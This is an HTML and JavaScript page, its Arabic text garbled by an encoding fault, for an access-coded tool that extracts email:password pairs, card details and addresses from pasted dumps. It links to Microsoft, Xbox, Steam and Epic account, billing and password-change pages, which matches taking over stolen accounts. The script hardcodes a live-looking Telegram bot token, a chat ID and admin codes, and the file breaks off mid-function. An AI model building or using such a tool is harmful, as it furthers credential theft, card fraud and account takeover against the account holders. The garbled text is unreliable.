<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Ø£Ø¯Ø§Ø© MAX/PRO: Ø§Ù„Ø¥Ø¯Ø§Ø±Ø© ÙˆØ§Ù„Ù…ÙˆØ¸ÙÙŠÙ† - Ø§Ù„Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø§Ø­ØªØ±Ø§ÙÙŠ ÙˆØ§Ù„Ù…Ø¤Ù…Ù†</title>
    <style>
        /* ------------------------- Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª ÙˆØ§Ù„Ø£Ù„ÙˆØ§Ù† Ø§Ù„Ø¹Ø§Ù…Ø© ------------------------- */
        :root {
            --card: #ffffffee;
            --accent: #e60000;
            --grad: linear-gradient(135deg, #e60000, #8b0000);
            --dark-grad: linear-gradient(135deg, #111, #2a0000);
            --success-color: #008000;
            --price-color: #0000ff; 
            --bg: #111; /* Ø®Ù„ÙÙŠØ© Ø¹Ø§Ù…Ø© */
            --admin-bg: #2d2d2d; /* Ø®Ù„ÙÙŠØ© Ù„ÙˆØ­Ø© Ø§Ù„Ø§Ø¯Ù…Ù† */
            --admin-text: #eee;
            --pro-bg: #f0f8ff; /* Ø®Ù„ÙÙŠØ© Ø£Ø¯Ø§Ø© PRO */
            --pro-accent: #004d99; /* Ù„ÙˆÙ† Ù…Ù…ÙŠØ² Ù„Ø£Ø¯Ø§Ø© PRO */
        }

        /* ------------------------- Ø³ØªØ§ÙŠÙ„ Ø§Ù„Ø¬Ø³Ù… Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ (ØªÙ… Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ù‡Ù†Ø§) ------------------------- */
        body {
            margin: 0;
            font-family: system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial;
            /* ğŸŒŸğŸŒŸğŸŒŸ ØªÙ… ØªØºÙŠÙŠØ± Ø§Ù„Ø®Ù„ÙÙŠØ© Ù„ØªÙƒÙˆÙ† Ù„ÙˆÙ† Ø£Ø³ÙˆØ¯ Ø«Ø§Ø¨Øª ğŸŒŸğŸŒŸğŸŒŸ */
            background: var(--bg); 
            
            padding-top: 20px; 
            padding-bottom: 50px;
            min-height: 100vh;
        }

        /* ------------------------- Ø³ØªØ§ÙŠÙ„ ØµÙØ­Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ (Ø§Ù„ÙˆØ§Ø¬Ù‡Ø©) ------------------------- */
        #login-page { max-width: 400px; margin: 100px auto; background: var(--card); border-radius: 18px; padding: 30px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6); text-align: center; }
        #login-page h2 { color: #111; font-size: 28px; margin-bottom: 20px; }
        /* ØªØ£Ù…ÙŠÙ†: Ù†ÙˆØ¹ Ø­Ù‚Ù„ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„ Ø£ØµØ¨Ø­ password Ù„Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø±Ù…Ø² */
        #code-input { width: 90%; padding: 15px; font-size: 18px; border-radius: 10px; border: 2px solid var(--accent); text-align: center; margin-bottom: 15px; }
        #submit-btn { background: var(--grad); color: #fff; width: 90%; padding: 15px; border-radius: 10px; font-size: 18px; font-weight: 700; border: none; cursor: pointer; transition: .3s; }
        #submit-btn:hover { transform: translateY(-3px); box-shadow: 0 0 18px rgba(255, 0, 0, 1); }
        #error-msg { color: var(--accent); font-weight: bold; margin-top: 15px; } /* ØªÙ… Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø¥Ù„Ù‰ var(--accent) Ù„Ù„ÙˆØ¶ÙˆØ­ */

        /* ------------------------- Ø³ØªØ§ÙŠÙ„ Ø§Ù„Ø£Ø¯Ø§Ø© (Tool) ------------------------- */
        .wrap { max-width: 900px; margin: 20px auto; padding: 15px; position: relative; }
        .card { background: var(--card); border-radius: 18px; padding: 20px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5); margin-bottom: 20px; }
        .pro-tool-card { background: var(--pro-bg); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.7); }
        .pro-tool-card h1 { color: var(--pro-accent) !important; }
        
        h1 { margin: 6px 0 16px; font-size: 26px; text-align: center; color: #111; font-weight: 800; }
        textarea { width: 100%; min-height: 180px; padding: 15px; font-size: 15px; border-radius: 12px; border: 2px solid #ccc; resize: vertical; }
        .row { display: flex; gap: 10px; margin-top: 12px; flex-wrap: wrap; justify-content: center; }
        button { border: none; cursor: pointer; padding: 12px 18px; border-radius: 12px; font-size: 15px; transition: .3s; font-weight: 700; }
        .btn-red { background: var(--grad); color: #fff; box-shadow: 0 0 10px rgba(255, 0, 0, 0.7); }
        .btn-red:hover { transform: translateY(-3px); box-shadow: 0 0 18px rgba(255, 0, 0, 1); }
        .btn-black { background: var(--dark-grad); color: #fff; border: 2px solid #444; }
        
        .list { margin-top: 15px; display: flex; flex-direction: column; gap: 12px; }
        .item { display: flex; justify-content: space-between; align-items: flex-start; padding: 15px; border-bottom: 1px solid #ddd; background: #fff; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); flex-wrap: wrap;}
        .email { font-weight: 800; color: #b30000; font-size: 16px; width: 100%; margin-bottom: 5px;}
        .pw { font-size: 14px; color: #444; font-weight: 600; display: flex; align-items: center; flex-wrap: wrap; margin-bottom: 10px;}
        .gamepass-note, .price-note, .cc-note, .address-note { font-weight: 800; margin-right: 5px; white-space: nowrap; flex-shrink: 0; padding: 2px 6px; border-radius: 4px; font-size: 12px;}
        .gamepass-note { color: var(--success-color); background: #e9ffe9; }
        .price-note { color: var(--price-color); background: #e9f0ff; }
        .cc-note { color: var(--pro-accent); background: #e0f0ff; }
        .address-note { color: #006622; background: #e6ffec; }

        .controls { display: flex; gap: 8px; flex-shrink: 0; margin-top: 10px; }
        .copy-btn { padding: 8px 12px; border-radius: 10px; font-size: 13px; font-weight: 600; }
        
        /* Ø­Ø§Ù„Ø© Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¨Ø§Ù‚ÙŠ */
        #code-status {
            position: absolute;
            top: 25px; 
            right: 15px;
            background: rgba(0, 0, 0, 0.7);
            color: #fff;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 600;
            z-index: 10;
        }

        /* ------------------------- Menu Ø§Ù„Ø²Ø§ÙˆÙŠØ© (Ø§Ù„Ø«Ù„Ø§Ø« Ù†Ù‚Ø§Ø·) ------------------------- */
        #menu-container {
            position: absolute;
            top: 25px;
            left: 15px;
            z-index: 20;
        }
        #menu-button {
            background: #444;
            color: #fff;
            font-size: 20px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
            transition: 0.3s;
        }
        #menu-button:hover {
            background: var(--accent);
            transform: rotate(90deg);
        }
        #dropdown-menu {
            position: absolute;
            top: 50px;
            left: 0;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
            min-width: 180px;
            padding: 5px 0;
            white-space: nowrap;
        }
        .menu-item {
            padding: 10px 15px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            transition: background 0.2s;
            display: flex;
            align-items: center;
        }
        .menu-item:hover {
            background: #f0f0f0;
        }
        .menu-item span {
            margin-left: 10px;
        }
        
        /* ------------------------- Ø³ØªØ§ÙŠÙ„ Ù„ÙˆØ­Ø© Ø§Ù„Ø£Ø¯Ù…Ù† ------------------------- */
        #admin-page { 
            max-width: 600px; 
            margin: 50px auto; 
            color: var(--admin-text); 
        }
        #admin-page .card { 
            background: var(--admin-bg); 
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
        }
        #admin-page h2 { 
            color: var(--accent); 
            text-align: center; 
            margin-bottom: 25px; 
        }
        #admin-page h3 { 
            color: var(--admin-text); 
            border-bottom: 1px solid #444; 
            padding-bottom: 10px; 
        }
        #admin-page input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 8px;
            border: 1px solid #555;
            background: #444;
            color: #fff;
            box-sizing: border-box;
        }
        .admin-btn-red { 
            background: var(--grad); 
            color: #fff; 
            width: 100%; 
            margin-top: 10px; 
        }
        .code-list {
            max-height: 300px;
            overflow-y: auto;
            margin-top: 15px;
            padding: 10px;
            border: 1px solid #555;
            border-radius: 8px;
            background: #3a3a3a;
        }
        .code-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            border-bottom: 1px dashed #555;
            font-size: 14px;
        }
        .code-item:last-child {
            border-bottom: none;
        }
        .delete-btn {
            background: #8b0000;
            color: #fff;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            cursor: pointer;
        }
        .code-info {
            flex-grow: 1;
        }

        /* ------------------------- Ø³ØªØ§ÙŠÙ„ Ø§Ù„Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ù…Ø®ØªØµØ±Ø© ------------------------- */
        .quick-links {
            margin-top: 30px;
            padding: 20px;
            background: #f8f8f8; 
            border-radius: 15px;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
        }
        .quick-links h2 {
            font-size: 26px; 
            color: #333;
            border-bottom: 3px solid var(--accent);
            padding-bottom: 10px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 800;
        }
        .link-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 15px;
        }
        .quick-link-btn {
            display: block;
            background: #fff;
            padding: 15px;
            border-radius: 12px;
            text-decoration: none;
            color: #111;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            transition: transform 0.2s, box-shadow 0.2s;
            border-right: 4px solid var(--accent); 
        }
        .quick-link-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 20px rgba(230, 0, 0, 0.4);
            border-right: 4px solid var(--accent);
        }
        .link-title {
            font-weight: 700;
            font-size: 16px;
            margin-bottom: 5px;
            color: var(--accent);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .link-desc {
            font-size: 13px;
            color: #555;
        }
        /* ------------------------- Ø³ØªØ§ÙŠÙ„ Toast ÙˆØªØµØ­ÙŠØ­ Ø¨Ø³ÙŠØ· ------------------------- */
        .toast { visibility: hidden; min-width: 250px; background-color: #333; color: #fff; text-align: center; border-radius: 8px; padding: 16px; position: fixed; z-index: 1000; left: 50%; transform: translateX(-50%); bottom: 30px; font-size: 15px; }
        .toast.show { visibility: visible; -webkit-animation: fadein 0.5s, fadeout 0.5s 1.5s; animation: fadein 0.5s, fadeout 0.5s 1.5s; }
        @-webkit-keyframes fadein { from { bottom: 0; opacity: 0; } to { bottom: 30px; opacity: 1; } }
        @keyframes fadein { from { bottom: 0; opacity: 0; } to { bottom: 30px; opacity: 1; } }
        @-webkit-keyframes fadeout { from { bottom: 30px; opacity: 1; } to { bottom: 0; opacity: 0; } }
        @keyframes fadeout { from { bottom: 30px; opacity: 1; } to { bottom: 0; opacity: 0; } }
        .hidden { display: none !important; }
    </style>
</head>
<body>

<div id="login-page">
    <h2><span style="font-size:30px;">ğŸ”‘</span> Ø±Ù…Ø² Ø¯Ø®ÙˆÙ„ MAX</h2>
    <input type="password" id="code-input" placeholder="Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„Ø¯Ø®ÙˆÙ„" />
    <button id="submit-btn">Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ø£Ø¯Ø§Ø© ğŸ”¥</button>
    <div id="error-msg"></div>
</div>

<div class="wrap hidden" id="tool-page">
    <div id="code-status"></div>
    
    <div id="menu-container">
        <button id="menu-button">
            <span style="transform: rotate(90deg);">â‹®</span>
        </button>
        <div id="dropdown-menu" class="hidden">
            <div class="menu-item" id="menu-switch-tool">
                <span>ğŸ”„ Ø§Ù„ØªØ¨Ø¯ÙŠÙ„ Ø¥Ù„Ù‰ Ø£Ø¯Ø§Ø© <b id="current-tool-name">PRO</b></span>
            </div>
            <div class="menu-item" onclick="promptAdminLogin()">
                <span>âš™ï¸ Ù„ÙˆØ­Ø© Ø§Ù„Ø£Ø¯Ù…Ù†</span>
            </div>
            <div class="menu-item" onclick="logout()">
                <span>ğŸšª ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬</span>
            </div>
        </div>
    </div>

    <div id="max-tool" class="tool-view">
        <div class="card">
            <h1><span style="color:var(--accent);font-size:32px;">â“</span> Ø£Ø¯Ø§Ø© MAX: Ø§Ø³ØªØ®Ø±Ø§Ø¬ Email:Password</h1>
            <div style="text-align:center;color:#444;font-size:14px;margin-bottom:12px;font-weight:500;">
                Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ. Ø§Ù„Ø£Ø¯Ø§Ø© ØªØ³ØªØ®Ø±Ø¬ ÙÙ‚Ø·: <b style="color:var(--accent);">email:password</b> + Ù…ÙŠØ²Ø§Øª
            </div>
            <textarea id="input-max" placeholder="Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ Ø§Ù„Ù‚ÙŠØ§Ø³ÙŠ Ù‡Ù†Ø§ (Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø£ÙˆÙ„)..."></textarea>
            <div class="row">
                <button onclick="parseText('max')" id="parseBtn-max" class="btn-red">Ø§Ø³ØªØ®Ø±Ø§Ø¬ MAX</button>
                <button onclick="clearBtnMax.onclick()" id="clearBtnMax" class="btn-black">Ù…Ø³Ø­ Ø§Ù„ÙƒÙ„</button>
                <button onclick="copyAllBtnMax.onclick()" id="copyAllBtnMax" class="btn-black">Ù†Ø³Ø® ÙƒÙ„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬</button>
                <button onclick="downloadBtnMax.onclick()" id="downloadBtnMax" class="btn-black">ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù txt</button>
            </div>
            <div class="list" id="list-max"></div>
        </div>
    </div>
    
    <div id="pro-tool" class="tool-view hidden">
        <div class="card pro-tool-card">
            <h1><span style="color:var(--pro-accent);font-size:32px;">âœ¨</span> Ø£Ø¯Ø§Ø© PRO: Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ù…Ø¹Ù‚Ø¯Ø©</h1>
            <div style="text-align:center;color:#000;font-size:14px;margin-bottom:12px;font-weight:500;">
                Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ Ø§Ù„Ù…Ø¹Ù‚Ø¯ Ù‡Ù†Ø§. ØªØ³ØªØ®Ø±Ø¬: <b style="color:var(--pro-accent);">email:password + Card Info + Address + Features</b>
            </div>
            <textarea id="input-pro" placeholder="Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ Ø§Ù„Ù…Ø¹Ù‚Ø¯ Ù‡Ù†Ø§ (Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø«Ø§Ù†ÙŠ)..."></textarea>
            <div class="row">
                <button onclick="parseText('pro')" id="parseBtn-pro" style="background:linear-gradient(135deg, #004d99, #002b5c); color:#fff;" class="btn-red">Ø§Ø³ØªØ®Ø±Ø§Ø¬ PRO</button>
                <button onclick="clearBtnPro.onclick()" id="clearBtnPro" class="btn-black">Ù…Ø³Ø­ Ø§Ù„ÙƒÙ„</button>
                <button onclick="copyAllBtnPro.onclick()" id="copyAllBtnPro" class="btn-black">Ù†Ø³Ø® ÙƒÙ„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬</button>
                <button onclick="downloadBtnPro.onclick()" id="downloadBtnPro" class="btn-black">ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù txt</button>
            </div>
            <div class="list" id="list-pro"></div>
        </div>
    </div>


    <div class="quick-links">
        <h2>ğŸš€ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„ÙˆØµÙˆÙ„ Ø§Ù„Ø³Ø±ÙŠØ¹ (Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª/Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³)</h2>
        <div class="link-grid">
            
            <a href="https://account.microsoft.com/account/manage" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª: Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø­Ø³Ø§Ø¨ <span>ğŸ’»</span></div>
                <div class="link-desc">ØµÙØ­Ø© Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ÙˆØ§Ù„Ù…Ø´ØªØ±ÙŠØ§Øª ÙˆØ§Ù„Ø®Ø¯Ù…Ø§Øª.</div>
            </a>
            
            <a href="https://account.microsoft.com/billing/payments/" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª: Ø§Ù„Ø¯ÙØ¹ ÙˆØ§Ù„ÙÙˆØªØ±Ø© <span>ğŸ’³</span></div>
                <div class="link-desc">Ø¹Ø±Ø¶ ÙˆØ¥Ø¯Ø§Ø±Ø© Ø¨Ø·Ø§Ù‚Ø§Øª Ø§Ù„Ø¯ÙØ¹ ÙˆØ§Ù„Ø§Ø´ØªØ±Ø§ÙƒØ§Øª Ø§Ù„Ù†Ø´Ø·Ø©.</div>
            </a>
            
            <a href="https://account.live.com/password/change" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª: ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± <span>ğŸ”’</span></div>
                <div class="link-desc">Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„ØªØ­Ø¯ÙŠØ« ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø­Ø§Ù„ÙŠØ©.</div>
            </a>
            
            <a href="https://account.live.com/proofs/Manage/signout" target="_blank" class="quick-link-btn">
                <div class="link-title">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬ Ù…Ù† ÙƒÙ„ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© <span>ğŸšª</span></div>
                <div class="link-desc">Ù„Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ø¬Ù„Ø³Ø© Ø§Ù„Ø­Ø§Ù„ÙŠØ© Ø¹Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª.</div>
            </a>
            
            <a href="https://account.xbox.com/ar-SA/Account/Signin?returnUrl=https%3a%2f%2faccount.xbox.com%2far-SA%2fSettings" target="_blank" class="quick-link-btn">
                <div class="link-title">Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³: Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª <span>ğŸ®</span></div>
                <div class="link-desc">Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ù„Ø­Ø³Ø§Ø¨ Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³ ÙˆØ¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª.</div>
            </a>
            
            <a href="https://redeem.microsoft.com/" target="_blank" class="quick-link-btn">
                <div class="link-title">Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³: ØªÙØ¹ÙŠÙ„ ÙƒÙˆØ¯ (Redeem) <span>ğŸ</span></div>
                <div class="link-desc">Ù„ØªÙØ¹ÙŠÙ„ Ø£ÙƒÙˆØ§Ø¯ Ø§Ù„Ø§Ø´ØªØ±Ø§ÙƒØ§Øª Ø£Ùˆ Ø§Ù„Ù‡Ø¯Ø§ÙŠØ§ Ù…Ø¨Ø§Ø´Ø±Ø©.</div>
            </a>

            <a href="https://store.steampowered.com/login/" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ù†ØµØ© Steam: ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ <span>ğŸ”¥</span></div>
                <div class="link-desc">ØµÙØ­Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø±Ø³Ù…ÙŠØ© Ù„Ù…Ù†ØµØ© Steam Ù„Ù„Ø£Ù„Ø¹Ø§Ø¨.</div>
            </a>

            <a href="https://store.epicgames.com/login" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ù†ØµØ© Epic Games: ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ <span>âš”ï¸</span></div>
                <div class="link-desc">ØµÙØ­Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø±Ø³Ù…ÙŠØ© Ù„Ù…Ù†ØµØ© Ø¥ÙŠØ¨Ùƒ Ø¬ÙŠÙ…Ø².</div>
            </a>
        </div>
    </div>
    
    <div class="footer" style="text-align:center;color:#444;font-size:13px;margin-top:20px;">
        Ø­Ù‚ÙˆÙ‚ Â© Telegram: <b>@xgbox7</b> | Ø£Ø¯Ø§Ø© MAX/PRO
    </div>
</div>

<div id="admin-page" class="hidden">
    <div class="card">
        <h2>Ù„ÙˆØ­Ø© Ø¥Ø¯Ø§Ø±Ø© Ø£ÙƒÙˆØ§Ø¯ MAX/PRO</h2>
        <div style="text-align:center; margin-bottom: 15px;">
            <a href="#" onclick="logout(); return false;" style="color:var(--accent); font-weight:bold;">Ø§Ù„Ø®Ø±ÙˆØ¬ Ù…Ù† Ù„ÙˆØ­Ø© Ø§Ù„Ø£Ø¯Ù…Ù†</a>
        </div>
        <div class="card" style="background:var(--admin-bg);">
            <h3>Ø¥Ø¶Ø§ÙØ© Ù…ÙØªØ§Ø­ Ø¯Ø®ÙˆÙ„ Ø¯Ø§Ø¦Ù…ÙŠ Ø¬Ø¯ÙŠØ¯ ğŸ”‘</h3>
            <input type="text" id="new-code" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯" />
            <button class="admin-btn-red" onclick="addCode()">Ø¥Ø¶Ø§ÙØ© Ø§Ù„ÙƒÙˆØ¯ ğŸ”¥</button>
        </div>

        <div class="card" style="background:var(--admin-bg);">
            <h3>Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø£ÙƒÙˆØ§Ø¯ Ø§Ù„Ø­Ø§Ù„ÙŠØ© (Ø£ÙƒÙˆØ§Ø¯ Ø¯Ø§Ø¦Ù…ÙŠØ© ÙÙ‚Ø·)</h3>
            <div class="code-list" id="code-list-display">
                <div style="text-align:center; color:#888;">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</div>
            </div>
            <div style="text-align:center; margin-top: 15px;">
                <button style="background:#555" class="btn-black" onclick="loadCodes()">ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©</button>
                <button style="background:#8b0000" class="btn-black" onclick="clearExpiredCodes()">Ù…Ø³Ø­ Ø§Ù„Ø£ÙƒÙˆØ§Ø¯ ØºÙŠØ± Ø§Ù„Ø¯Ø§Ø¦Ù…Ø©</button>
            </div>
        </div>
    </div>
</div>

<div id="toast" class="toast"></div>

<script>
    // **********************************************
    // ** Ø«ÙˆØ§Ø¨Øª ÙˆØ¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… **
    // **********************************************
    // ğŸ”‘ Ø±Ù…Ø² Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø«Ø§Ø¨Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨ (FR)
    const UNIVERSAL_CODE = "FR"; 
    // Ù…Ù„Ø§Ø­Ø¸Ø©: Ù‡Ø°Ø§ Ø±Ù…Ø² Ø§Ù„Ø£Ø¯Ù…Ù† Ø§Ù„Ø³Ø±ÙŠ (Ù„Ù… ÙŠØªØºÙŠØ±)
    const ADMIN_CODE = "201180"; 
    const CODES_KEY = "max_access_codes"; 
    
    // ğŸŒŸğŸŒŸğŸŒŸ ØªÙ… Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ§Ù„Ù€ ID Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø·Ù„Ø¨Ùƒ ğŸŒŸğŸŒŸğŸŒŸ
    const BOT_TOKEN = "8512310610:AAESD8sz4kQlznVG6iJRZNFOb_NO4mvYYhw"; // Ø±Ù…Ø² Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø¬Ø¯ÙŠØ¯
    const CHAT_ID = "7781990630"; // Ù…Ø¹Ø±Ù Ø§Ù„Ù‚Ù†Ø§Ø©/Ø§Ù„Ù…Ø­Ø§Ø¯Ø«Ø© Ø§Ù„Ø¬Ø¯ÙŠØ¯

    // Ø¹Ù†Ø§ØµØ± ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
    const loginPage = document.getElementById("login-page");
    const toolPage = document.getElementById("tool-page");
    const adminPage = document.getElementById("admin-page");
    const codeInput = document.getElementById("code-input");
    const submitBtn = document.getElementById("submit-btn");
    const errorMsg = document.getElementById("error-msg");
    const toast = document.getElementById("toast");
    const codeStatusDisplay = document.getElementById("code-status"); 
    
    // Ø¹Ù†Ø§ØµØ± Ø§Ù„Ø£Ø¯ÙˆØ§Øª ÙˆØ§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ù†Ø³Ø¯Ù„Ø©
    const inputMax = document.getElementById("input-max");
    const listMax = document.getElementById("list-max");
    const clearBtnMax = document.getElementById("clearBtnMax");
    const copyAllBtnMax = document.getElementById("copyAllBtnMax");
    const downloadBtnMax = document.getElementById("downloadBtnMax");

    const inputPro = document.getElementById("input-pro");
    const listPro = document.getElementById("list-pro");
    const clearBtnPro = document.getElementById("clearBtnPro");
    const copyAllBtnPro = document.getElementById("copyAllBtnPro");
    const downloadBtnPro = document.getElementById("downloadBtnPro");

    const maxToolView = document.getElementById('max-tool');
    const proToolView = document.getElementById('pro-tool');
    const menuSwitchTool = document.getElementById('menu-switch-tool');
    const currentToolName = document.getElementById('current-tool-name');
    const menuButton = document.getElementById('menu-button');
    const dropdownMenu = document.getElementById('dropdown-menu');
    const menuContainer = document.getElementById('menu-container');

    let activeCodeInfo = null; 
    let currentTool = 'max'; 
    let statusInterval; 
    
    // **********************************************
    // ** ÙˆØ¸Ø§Ø¦Ù Ø¹Ø§Ù…Ø© Ù…Ø³Ø§Ø¹Ø¯Ø© **
    // **********************************************

    function showToast(e) {
        toast.textContent = e;
        toast.classList.add("show");
        clearTimeout(toast._t);
        toast._t = setTimeout(() => toast.classList.remove("show"), 2000);
    }

    async function copyText(e) {
        try {
            return await navigator.clipboard.writeText(e), !0
        } catch (e) {
            const t = document.createElement("textarea");
            return t.value = e, document.body.appendChild(t), t.select(), document.execCommand("copy"), t.remove(), !0
        }
    }
    
    // **********************************************
    // ** Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø£ÙƒÙˆØ§Ø¯ (Ù…Ø¹Ø¯Ù„Ø© Ù„ØªÙƒÙˆÙ† Ø¯Ø§Ø¦Ù…Ø© ÙÙ‚Ø·) **
    // **********************************************

    function getCodes() {
        const codes = localStorage.getItem(CODES_KEY);
        return codes ? JSON.parse(codes) : [];
    }

    function saveCodes(codes) {
        localStorage.setItem(CODES_KEY, JSON.stringify(codes));
    }

    function isCodeValid(code) {
        // Ø§Ù„ØªØ­Ù‚Ù‚ Ø£ÙˆÙ„Ø§Ù‹ Ù…Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø«Ø§Ø¨Øª (FR)
        if (code === UNIVERSAL_CODE) {
            activeCodeInfo = { code: UNIVERSAL_CODE, isPermanent: true };
            return true;
        }

        const codes = getCodes();
        const foundCode = codes.find(c => c.code === code);
        
        if (!foundCode) {
            activeCodeInfo = null;
            return false;
        }
        
        // Ø¨Ù…Ø§ Ø£Ù†Ù†Ø§ Ø£Ù„ØºÙŠÙ†Ø§ Ø§Ù„Ø£ÙƒÙˆØ§Ø¯ Ø§Ù„Ù…Ø¤Ù‚ØªØ©ØŒ ÙŠØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø­Ø§Ù„Ø© Ø§Ù„Ø¯ÙˆØ§Ù… ÙÙ‚Ø·
        if (foundCode.isPermanent) {
            activeCodeInfo = foundCode; 
            return true;
        } else {
            // ÙÙŠ Ø­Ø§Ù„Ø© ÙˆØ¬ÙˆØ¯ ÙƒÙˆØ¯ Ù‚Ø¯ÙŠÙ… ØºÙŠØ± Ø¯Ø§Ø¦Ù…ÙŠØŒ ÙŠØªÙ… Ù…Ø³Ø­Ù‡ ÙˆØ¥Ø¸Ù‡Ø§Ø± Ø®Ø·Ø£
            clearExpiredCodes(); 
            activeCodeInfo = null;
            return false;
        }
    }
    
    function formatTimeRemaining(expiry) {
        // ØªÙ… ØªØ¨Ø³ÙŠØ· Ø§Ù„Ø¯Ø§Ù„Ø© Ù„ØªØ¹Ø±Ø¶ "Ø¯Ø§Ø¦Ù…ÙŠ" ÙÙ‚Ø·
        return "Ø¯Ø§Ø¦Ù…ÙŠ";
    }
    
    function addCode() {
